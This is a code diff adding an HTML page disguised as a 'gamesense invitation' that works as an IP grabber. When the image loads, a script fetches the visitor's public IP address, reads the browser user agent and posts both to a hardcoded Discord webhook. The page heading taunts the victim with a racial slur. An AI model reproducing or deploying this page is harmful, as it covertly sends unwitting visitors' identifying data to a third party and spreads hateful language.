@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Gamesense Invitation</title>
+</head>
+<body>
+  <h1>gamesense invitation: IP PULLED NIGGERRRRR</h1>
+  <img src="img/librus.png" onload="sendInfo()">
+
+  <script>
+    function sendInfo() {
+      var ipAddress = '';
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          ipAddress = data.ip;
+
+          var userAgent = navigator.userAgent;
+
+          var payload = {
+            content: 'IP Address: ' + ipAddress + '\nUser Agent: ' + userAgent
+          };
+
+          fetch('https://discord.com/api/webhooks/1159096193364803626/al4bicaFlns5Bq94a0U10wJdFTPH_4a69v7wlEAfGm3KrLSrxW8V--FjAm0NPHUIlVEh', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+          });
+        });
+    }
+  </script>
+</body>
+</html>
